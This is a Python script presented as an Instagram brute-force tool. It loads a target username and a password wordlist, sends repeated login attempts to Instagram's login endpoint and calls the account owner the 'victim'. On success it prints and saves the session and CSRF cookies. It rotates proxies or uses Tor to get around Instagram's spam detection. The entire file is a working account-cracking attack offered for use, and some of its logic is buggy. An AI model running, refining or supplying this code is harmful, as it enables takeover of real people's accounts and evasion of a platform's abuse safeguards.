import os
import time
import json
import argparse
import requests
import threading
from datetime import datetime
from fake_user_agents import UserAgent

instagram_url = "https://www.instagram.com/accounts/login/"
instagram_url_login = "https://www.instagram.com/accounts/login/ajax/"

payload = {
    "queryParams": {},
    "optIntoOneTap": "false"
}

login_header = {
    "User-Agent": UserAgent().random,
    "X-Requested-With": "XMLHttpRequest",
    "Referer": instagram_url
}

# Prompt the user to enter the CSRF token
csrf = "xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe"
login_header.update({"x-csrftoken": csrf})

def green(text):
    return "\033[92m{}\033[00m".format(text)

def blue(text):
    return "\033[94m{}\033[00m".format(text)

def red(text):
    return "\033[91m{}\033[00m".format(text)

def attack_start_notify(target):
    try:
        os.system(f'herbe "Starting attack to victim: {target}"')
        print(blue(f"Starting attack to victim: {target}"))
    except:
        print(blue(f"Starting attack to victim: {target}"))

def attack_hack_notify(hack, speed):
    try:
        os.system(f"herbe 'target password founded: {hack}'")
        print(green(f"[+] target password founded: {hack}"))
        print(f"[*] Typing speed: {speed} attempts per minute")
    except:
        print(green(f"[+] target password founded: {hack}"))
        print(f"[*] Typing speed: {speed} attempts per minute")

def crack(save, session, password, victim, start_time, tries):
    global hack_request
    hack_request = session.post(instagram_url_login, data=payload, headers=login_header)
    threading.Thread(target=attack_start_notify, args=(victim,)).start()
    if save:
        with open(f"tryed/{victim}", "a") as tryed:
            tryed.write(password)
    print(f"[-] trying password: {blue(password)}")
    try:
        hack_data = json.loads(hack_request.text)
    except json.JSONDecodeError:
        print(red("[-] Invalid response from the server. Retrying..."))
        return {"authenticated": False}
    print(f'[{green("INFO")}]: {hack_data}')
    time_taken = (time.time() - start_time) / 60  # Calculate time taken in minutes
    speed = tries / time_taken
    return hack_data, speed

def attack(target, wordlist_file, save, proxies=None):
    tries = 0
    start_time = time.time()
    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)
    for hack in wordlist_file:
        tries += 1
        hack = hack.strip()
        payload.update({
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{hack}"
        })
        try:
            hack_data, speed = crack(save, session, hack, target, start_time, tries)
            if hack_data["authenticated"]:
                threading.Thread(target=attack_hack_notify, args=(hack, speed)).start()
                cookies = hack_request.cookies
                cookie_jar = cookies.get_dict()
                csrf_token = cookie_jar['csrftoken']
                print("csrf_token: ", csrf_token)
                session_id = cookie_jar['sessionid']
                print("session_id: ", session_id)
                with open(f"hacked/{hack}", "a") as hacked:
                    hacked.write(hack)
                break
        except KeyError:
            time.sleep(2)
            print(red("[-] Instagram detected spam attack"))
            if proxies:
                print(green("[+] Changing proxy..."))
                session.proxies.clear()  # Remove all proxies
            else:
                print(green("[+] Changing server..."))
                session.proxies = None
            hack_data, speed = crack(save, session, hack, target, start_time, tries)

def load_proxies(proxies_file):
    with open(proxies_file, "r") as file:
        proxies = file.readlines()
    proxies = [proxy.strip() for proxy in proxies]
    proxies = [{'http': proxy, 'https': proxy} for proxy in proxies]
    return proxies

def main():
    parser = argparse.ArgumentParser(description="Instagram Brute Force")
    parser.add_argument("--config", help="Path to the config file", default="config.json")
    args = parser.parse_args()

    with open(args.config, "r") as config_file:
        config = json.load(config_file)

    target = config.get("target")
    wordlist_file = config.get("wordlist")
    save_tried_passwords = config.get("save_tried_passwords")
    use_proxies = config.get("use_proxies")

    if not all([target, wordlist_file, save_tried_passwords, use_proxies]):
        print(red("[-] Configuration file is missing required fields."))
        exit()

    try:
        bruteforce = open(wordlist_file, "r")
    except FileNotFoundError:
        print(red("[-] Wordlist file not found"))
        exit()

    print(blue(f"[+] Target username: {target}"))
    print(blue(f"[+] Wordlist path: {wordlist_file}"))
    print(blue(f"[+] Save tried passwords: {save_tried_passwords}"))
    print(blue(f"[+] Use proxies: {use_proxies}"))

    proxies = None
    if use_proxies is True:
        proxies_file = config.get("proxies_file")
        if not proxies_file:
            print(red("[-] Proxies file path not specified in the configuration."))
            exit()
        proxies = load_proxies(proxies_file)
        if not proxies:
            print(red("[-] Proxies file not found or empty."))
            exit()
    elif use_proxies == "tor on":
        proxies = {
            'http': 'socks5://localhost:9050',
            'https': 'socks5://localhost:9050'
        }
    elif use_proxies == "tor off":
        proxies = None
    else:
        print(red("[-] Invalid input for proxies/Tor. Please enter 'use proxies', 'tor on', or 'tor off'."))
        exit()

    attack(target, bruteforce, save_tried_passwords, proxies)

if __name__ == "__main__":
    main()
